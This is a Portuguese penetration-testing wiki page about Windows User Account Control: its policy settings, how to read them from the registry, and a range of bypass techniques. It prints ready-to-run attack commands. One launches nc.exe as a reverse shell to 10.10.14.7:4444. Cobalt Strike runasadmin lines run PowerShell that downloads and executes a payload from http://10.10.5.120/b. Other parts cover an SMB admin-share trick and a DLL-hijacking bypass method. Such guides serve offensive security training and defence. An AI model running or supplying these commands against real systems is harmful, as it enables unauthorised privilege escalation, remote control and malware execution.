# UAC - Controle de Conta de Usuário

{{#include ../../banners/hacktricks-training.md}}

## UAC

[Controle de Conta de Usuário (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) é um recurso que permite um **prompt de consentimento para atividades elevadas**. Aplicativos têm diferentes níveis de `integridade`, e um programa com um **alto nível** pode realizar tarefas que **podem potencialmente comprometer o sistema**. Quando o UAC está habilitado, aplicativos e tarefas sempre **são executados sob o contexto de segurança de uma conta não-administradora** a menos que um administrador autorize explicitamente esses aplicativos/tarefas a ter acesso de nível administrador ao sistema para serem executados. É um recurso de conveniência que protege os administradores de alterações não intencionais, mas não é considerado uma barreira de segurança.

Para mais informações sobre níveis de integridade:

{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Quando o UAC está em vigor, um usuário administrador recebe 2 tokens: uma chave de usuário padrão, para realizar ações regulares como nível regular, e uma com privilégios de administrador.

Esta [página](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discute como o UAC funciona em grande profundidade e inclui o processo de logon, a experiência do usuário e a arquitetura do UAC. Administradores podem usar políticas de segurança para configurar como o UAC funciona especificamente para sua organização em nível local (usando secpol.msc), ou configurado e distribuído via Objetos de Política de Grupo (GPO) em um ambiente de domínio Active Directory. As várias configurações são discutidas em detalhes [aqui](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Existem 10 configurações de Política de Grupo que podem ser definidas para o UAC. A tabela a seguir fornece detalhes adicionais:

| Configuração de Política de Grupo                                                                                                                                                                                                                                                                                                                                                           | Chave do Registro           | Configuração Padrão                                         |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ----------------------------------------------------------- |
| [Controle de Conta de Usuário: Modo de Aprovação do Administrador para a conta Administrador embutida](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Desativado                                                  |
| [Controle de Conta de Usuário: Permitir que aplicativos UIAccess solicitem elevação sem usar a área de trabalho segura](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Desativado                                                  |
| [Controle de Conta de Usuário: Comportamento do prompt de elevação para administradores no Modo de Aprovação do Administrador](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Solicitar consentimento para binários não-Windows          |
| [Controle de Conta de Usuário: Comportamento do prompt de elevação para usuários padrão](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Solicitar credenciais na área de trabalho segura           |
| [Controle de Conta de Usuário: Detectar instalações de aplicativos e solicitar elevação](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Habilitado (padrão para home) Desativado (padrão para enterprise) |
| [Controle de Conta de Usuário: Somente elevar executáveis que estão assinados e validados](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Desativado                                                  |
| [Controle de Conta de Usuário: Somente elevar aplicativos UIAccess que estão instalados em locais seguros](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Habilitado                                                 |
| [Controle de Conta de Usuário: Executar todos os administradores no Modo de Aprovação do Administrador](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Habilitado                                                 |
| [Controle de Conta de Usuário: Mudar para a área de trabalho segura ao solicitar elevação](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Habilitado                                                 |
| [Controle de Conta de Usuário: Virtualizar falhas de gravação de arquivos e registro para locais por usuário](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Habilitado                                                 |

### Teoria de Bypass do UAC

Alguns programas são **autoelevados automaticamente** se o **usuário pertence** ao **grupo de administradores**. Esses binários têm dentro de seus _**Manifests**_ a opção _**autoElevate**_ com valor _**True**_. O binário também deve ser **assinado pela Microsoft**.

Então, para **burlar** o **UAC** (elevar do nível de integridade **médio** **para alto**) alguns atacantes usam esse tipo de binários para **executar código arbitrário** porque será executado a partir de um **processo de alta integridade**.

Você pode **verificar** o _**Manifest**_ de um binário usando a ferramenta _**sigcheck.exe**_ do Sysinternals. E você pode **ver** o **nível de integridade** dos processos usando _Process Explorer_ ou _Process Monitor_ (do Sysinternals).

### Verificar UAC

Para confirmar se o UAC está habilitado, faça:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Se for **`1`**, então o UAC está **ativado**, se for **`0`** ou **não existir**, então o UAC está **inativo**.

Em seguida, verifique **qual nível** está configurado:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- Se **`0`**, então, o UAC não solicitará (como **desativado**)
- Se **`1`**, o administrador é **solicitado a fornecer nome de usuário e senha** para executar o binário com altos direitos (no Secure Desktop)
- Se **`2`** (**Sempre me notifique**) o UAC sempre pedirá confirmação ao administrador quando ele tentar executar algo com altos privilégios (no Secure Desktop)
- Se **`3`**, como `1`, mas não necessariamente no Secure Desktop
- Se **`4`**, como `2`, mas não necessariamente no Secure Desktop
- se **`5`**(**padrão**), pedirá ao administrador para confirmar a execução de binários não Windows com altos privilégios

Então, você deve olhar para o valor de **`LocalAccountTokenFilterPolicy`**\
Se o valor for **`0`**, então, apenas o usuário **RID 500** (**Administrador embutido**) pode realizar **tarefas administrativas sem UAC**, e se for `1`, **todas as contas dentro do grupo "Administradores"** podem fazê-lo.

E, finalmente, olhe para o valor da chave **`FilterAdministratorToken`**\
Se **`0`**(padrão), a **conta de Administrador embutido pode** realizar tarefas de administração remota e se **`1`**, a conta de Administrador embutido **não pode** realizar tarefas de administração remota, a menos que `LocalAccountTokenFilterPolicy` esteja definido como `1`.

#### Resumo

- Se `EnableLUA=0` ou **não existir**, **sem UAC para ninguém**
- Se `EnableLua=1` e **`LocalAccountTokenFilterPolicy=1`, sem UAC para ninguém**
- Se `EnableLua=1` e **`LocalAccountTokenFilterPolicy=0` e `FilterAdministratorToken=0`, sem UAC para RID 500 (Administrador embutido)**
- Se `EnableLua=1` e **`LocalAccountTokenFilterPolicy=0` e `FilterAdministratorToken=1`, UAC para todos**

Todas essas informações podem ser coletadas usando o módulo **metasploit**: `post/windows/gather/win_privs`

Você também pode verificar os grupos do seu usuário e obter o nível de integridade:
```
net user %username%
whoami /groups | findstr Level
```
## Bypass do UAC

> [!NOTE]
> Note que se você tiver acesso gráfico à vítima, o bypass do UAC é simples, pois você pode simplesmente clicar em "Sim" quando o prompt do UAC aparecer.

O bypass do UAC é necessário na seguinte situação: **o UAC está ativado, seu processo está sendo executado em um contexto de integridade média e seu usuário pertence ao grupo de administradores**.

É importante mencionar que é **muito mais difícil contornar o UAC se ele estiver no nível de segurança mais alto (Sempre) do que se estiver em qualquer um dos outros níveis (Padrão).**

### UAC desativado

Se o UAC já estiver desativado (`ConsentPromptBehaviorAdmin` é **`0`**) você pode **executar um shell reverso com privilégios de administrador** (nível de integridade alto) usando algo como:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Bypass de UAC com duplicação de token

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Muito** Básico "bypass" de UAC (acesso total ao sistema de arquivos)

Se você tiver um shell com um usuário que está dentro do grupo Administradores, você pode **montar o C$** compartilhado via SMB (sistema de arquivos) local em um novo disco e você terá **acesso a tudo dentro do sistema de arquivos** (até mesmo a pasta inicial do Administrador).

> [!WARNING]
> **Parece que esse truque não está funcionando mais**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Bypass de UAC com Cobalt Strike

As técnicas do Cobalt Strike só funcionarão se o UAC não estiver configurado no seu nível máximo de segurança.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** e **Metasploit** também têm vários módulos para **bypass** do **UAC**.

### KRBUACBypass

Documentação e ferramenta em [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploits de bypass do UAC

[**UACME** ](https://github.com/hfiref0x/UACME) que é uma **compilação** de vários exploits de bypass do UAC. Note que você precisará **compilar o UACME usando o visual studio ou msbuild**. A compilação criará vários executáveis (como `Source\Akagi\outout\x64\Debug\Akagi.exe`), você precisará saber **qual você precisa.**\
Você deve **ter cuidado** porque alguns bypasses irão **solicitar outros programas** que irão **alertar** o **usuário** que algo está acontecendo.

O UACME tem a **versão de compilação a partir da qual cada técnica começou a funcionar**. Você pode procurar por uma técnica que afete suas versões:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Também, usando [esta](https://en.wikipedia.org/wiki/Windows_10_version_history) página você obtém a versão do Windows `1607` a partir das versões de build.

#### Mais bypass de UAC

**Todas** as técnicas usadas aqui para contornar o AUC **requerem** um **shell interativo completo** com a vítima (um shell comum do nc.exe não é suficiente).

Você pode obter usando uma sessão de **meterpreter**. Migre para um **processo** que tenha o valor de **Session** igual a **1**:

![](<../../images/image (96).png>)

(_explorer.exe_ deve funcionar)

### Bypass de UAC com GUI

Se você tiver acesso a uma **GUI, você pode simplesmente aceitar o prompt de UAC** quando ele aparecer, você realmente não precisa de um bypass. Assim, obter acesso a uma GUI permitirá que você contorne o UAC.

Além disso, se você obtiver uma sessão GUI que alguém estava usando (potencialmente via RDP), há **algumas ferramentas que estarão rodando como administrador** de onde você poderia **executar** um **cmd** por exemplo **como admin** diretamente sem ser solicitado novamente pelo UAC como [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Isso pode ser um pouco mais **furtivo**.

### Bypass de UAC barulhento por força bruta

Se você não se importa em ser barulhento, você sempre poderia **executar algo como** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) que **pede para elevar permissões até que o usuário aceite**.

### Seu próprio bypass - Metodologia básica de bypass de UAC

Se você der uma olhada no **UACME**, você notará que **a maioria dos bypasses de UAC abusa de uma vulnerabilidade de Dll Hijacking** (principalmente escrevendo a dll maliciosa em _C:\Windows\System32_). [Leia isso para aprender como encontrar uma vulnerabilidade de Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking.md).

1. Encontre um binário que irá **autoelevar** (verifique se, quando executado, ele roda em um nível de integridade alto).
2. Com o procmon, encontre eventos "**NAME NOT FOUND**" que podem ser vulneráveis a **DLL Hijacking**.
3. Você provavelmente precisará **escrever** a DLL dentro de alguns **caminhos protegidos** (como C:\Windows\System32) onde você não tem permissões de escrita. Você pode contornar isso usando:
   1. **wusa.exe**: Windows 7, 8 e 8.1. Permite extrair o conteúdo de um arquivo CAB dentro de caminhos protegidos (porque essa ferramenta é executada a partir de um nível de integridade alto).
   2. **IFileOperation**: Windows 10.
4. Prepare um **script** para copiar sua DLL dentro do caminho protegido e executar o binário vulnerável e autoelevado.

### Outra técnica de bypass de UAC

Consiste em observar se um **binário autoElevado** tenta **ler** do **registro** o **nome/caminho** de um **binário** ou **comando** a ser **executado** (isso é mais interessante se o binário busca essa informação dentro do **HKCU**).

{{#include ../../banners/hacktricks-training.md}}
